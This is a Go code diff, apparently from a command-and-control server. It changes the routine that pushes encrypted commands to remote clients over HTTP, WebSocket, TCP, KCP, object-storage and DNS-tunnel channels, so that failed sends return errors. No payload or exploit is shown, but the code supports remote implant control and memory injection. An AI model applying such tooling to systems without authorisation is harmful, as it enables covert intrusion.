@@ -269,14 +269,22 @@ func cleanupDeadConnection(listenerType, uid string, conn interface{ Close() err
 
 // ============ 协议发送（SendCommand / SendFileUploadCommand 共用） ============
 
-// sendByProtocol 按监听器协议类型将已编码命令下发
+// sendByProtocol 按监听器协议类型将已编码命令下发（忽略失败详情，保持原有调用方语义）
 func sendByProtocol(listenerType, uid string, byteToSend []byte, logCtx string) {
+	_ = sendByProtocolErr(listenerType, uid, byteToSend, logCtx)
+}
+
+// sendByProtocolErr 下发并如实返回失败原因：队列满、连接不存在、加密失败、写入失败。
+// 原来这些分支只打日志，调用方一律当成功——/api/bin/execute 因此会把"命令已被丢弃"
+// 报成 200，前端一直显示"已发送"。
+func sendByProtocolErr(listenerType, uid string, byteToSend []byte, logCtx string) error {
 	switch listenerType {
 	case "web", "http", "https":
 		// 轮询客户端使用命令队列机制
 		// 【背压】队列满时告警放弃（不再静默丢最旧导致分块损坏）
 		if !command1.CommandQueues.AddCommand(uid, byteToSend) {
 			logx.Warnf("⚠️ 命令队列已满，丢弃命令: %s, UID=%s\n", logCtx, uid)
+			return fmt.Errorf("命令队列已满，命令未下发")
 		}
 
 	case "websocket", "ws_forward":
@@ -286,13 +294,13 @@ func sendByProtocol(listenerType, uid string, byteToSend []byte, logCtx string) 
 		if !exists || conn == nil {
 			logx.Warnf("⚠️ WebSocket连接不存在或已关闭: %s\n", uid)
 			cleanupDeadConnection(listenerType, uid, conn, logCtx)
-			return
+			return fmt.Errorf("WebSocket 连接不存在或已关闭")
 		}
 		cmdBytes, err := encrypt.EncryptWithSessionKey(byteToSend, uid)
 		if err != nil {
 			// 【加密体系改造】加密失败直接返回，不再回落旧加密
 			logx.Warnf("⚠️ 高级加密失败: %v\n", err)
-			return
+			return fmt.Errorf("命令加密失败: %w", err)
 		}
 		cmdBase64, _ := encrypt.EncodeBase64(cmdBytes)
 		// 每连接写互斥：防止并发写帧交错；写 deadline 防慢客户端永久阻塞（背压）
@@ -305,6 +313,7 @@ func sendByProtocol(listenerType, uid string, byteToSend []byte, logCtx string) 
 			logx.Warnf("⚠️ WebSocket连接写入失败: %s, 错误: %v\n", uid, err)
 			// I3: 关闭连接触发读循环退出 → 完整清理（原只删 map → 幽灵连接）
 			cleanupDeadConnection(listenerType, uid, conn, logCtx)
+			return fmt.Errorf("WebSocket 写入失败: %w", err)
 		}
 
 	case "tcp", "tcp_forward", "http_forward", "https_forward":
@@ -314,13 +323,13 @@ func sendByProtocol(listenerType, uid string, byteToSend []byte, logCtx string) 
 		if !exists || conn == nil {
 			logx.Warnf("⚠️ TCP连接不存在或已关闭: %s\n", uid)
 			cleanupDeadConnection(listenerType, uid, nil, logCtx)
-			return
+			return fmt.Errorf("TCP 连接不存在或已关闭")
 		}
 		cmdBytes, err := encrypt.EncryptWithSessionKey(byteToSend, uid)
 		if err != nil {
 			// 【加密体系改造】加密失败直接返回，不再回落旧加密
 			logx.Warnf("⚠️ 高级加密失败: %v\n", err)
-			return
+			return fmt.Errorf("命令加密失败: %w", err)
 		}
 		cmdBase64, _ := encrypt.EncodeBase64(cmdBytes)
 		cmdLen := len(cmdBase64)
@@ -336,13 +345,14 @@ func sendByProtocol(listenerType, uid string, byteToSend []byte, logCtx string) 
 			writeLock.Unlock()
 			logx.Warnf("⚠️ TCP连接写入失败: %s, 错误: %v\n", uid, err)
 			cleanupDeadConnection(listenerType, uid, conn, logCtx)
-			return
+			return fmt.Errorf("TCP 写入失败: %w", err)
 		}
 		err = writer.Flush()
 		writeLock.Unlock()
 		if err != nil {
 			logx.Warnf("⚠️ TCP连接刷新失败: %s, 错误: %v\n", uid, err)
 			cleanupDeadConnection(listenerType, uid, conn, logCtx)
+			return fmt.Errorf("TCP 刷新失败: %w", err)
 		}
 
 	case "kcp", "kcp_forward":
@@ -352,13 +362,13 @@ func sendByProtocol(listenerType, uid string, byteToSend []byte, logCtx string) 
 		if !exists || conn == nil {
 			logx.Warnf("⚠️ KCP连接不存在或已关闭: %s\n", uid)
 			cleanupDeadConnection(listenerType, uid, nil, logCtx)
-			return
+			return fmt.Errorf("KCP 连接不存在或已关闭")
 		}
 		cmdBytes, err := encrypt.EncryptWithSessionKey(byteToSend, uid)
 		if err != nil {
 			// 【加密体系改造】加密失败直接返回，不再回落旧加密
 			logx.Warnf("⚠️ 高级加密失败: %v\n", err)
-			return
+			return fmt.Errorf("命令加密失败: %w", err)
 		}
 		cmdBase64, _ := encrypt.EncodeBase64(cmdBytes)
 		cmdLen := len(cmdBase64)
@@ -375,13 +385,14 @@ func sendByProtocol(listenerType, uid string, byteToSend []byte, logCtx string) 
 			// 统一离线入口：置 Online=2 + 离线事件 + 队列清理
 			connection.MarkOffline(uid, listenerType, "写入失败")
 			logx.Infof("🔌 [KCP写入失败] 客户端连接已清理: %s\n", uid)
+			return fmt.Errorf("KCP 写入失败: %w", err)
 		}
 
 	case "oss":
 		cmdBytes, err := encrypt.EncryptWithSessionKey(byteToSend, uid)
 		if err != nil {
 			logx.Warnf("⚠️ 高级加密失败: %v\n", err)
-			return
+			return fmt.Errorf("命令加密失败: %w", err)
 		}
 		cmdBase64, _ := encrypt.EncodeBase64(cmdBytes)
 		// 按 uid 取回服务该客户端的 OSS 监听器：多监听器下不能再用全局 client
@@ -391,17 +402,21 @@ func sendByProtocol(listenerType, uid string, byteToSend []byte, logCtx string) 
 			oss.Send(c, uid+fmt.Sprintf("/server_%020d", time.Now().UnixNano()), cmdBase64)
 		} else {
 			logx.Warnf("⚠️ [OSS] 客户端 %s 未登记到任何 OSS 监听器，命令未下发（监听器可能已停止）\n", uid)
+			return fmt.Errorf("客户端未登记到任何 OSS 监听器，命令未下发")
 		}
 
 	case "dns":
 		// DNS 隧道：命令放入队列，客户端轮询时取走（由 dns listener 的 handlePull 下发）
 		if !command1.CommandQueues.AddCommand(uid, byteToSend) {
 			logx.Warnf("⚠️ 命令队列已满，丢弃命令: %s, UID=%s\n", logCtx, uid)
+			return fmt.Errorf("命令队列已满，命令未下发")
 		}
 
 	default:
 		logx.Warnf("⚠️ 未知的连接类型: %s 对于 UID: %s\n", listenerType, uid)
+		return fmt.Errorf("未知的连接类型: %s", listenerType)
 	}
+	return nil
 }
 
 // InjectMemDispatcher 控制台 inject 命令分发回调（由 main 注册到 api.DispatchInject）：
@@ -433,6 +448,19 @@ func SendFileUploadCommand(uid string, byteToSend []byte) {
 		return
 	}
 	sendByProtocol(listenerType, uid, byteToSend, "文件上传")
+}
+
+// SendFileUploadCommandChecked 发送已编码命令字节并返回失败原因。
+// 与 SendFileUploadCommand 的差别是"真的知道有没有发出去"（队列满 / 连接不存在 /
+// 加密或写入失败都会返回错误），供 /api/bin/execute 这类必须如实回报结果的入口使用。
+// 注意不要拿 SendFileUploadCommandWithResult 顶替：那个变体对持久连接类型只做存在性
+// 检查、不实际发送（inject-mem 的分块循环依赖它的语义）。
+func SendFileUploadCommandChecked(uid string, byteToSend []byte) error {
+	listenerType, exists := getListenerType(uid)
+	if !exists {
+		return fmt.Errorf("客户端连接类型未知（可能已离线）: %s", uid)
+	}
+	return sendByProtocolErr(listenerType, uid, byteToSend, "文件上传")
 }
 
 // SendFileUploadCommandWithResult 发送已编码命令字节并返回是否成功（供注入分块校验，避免静默丢包）
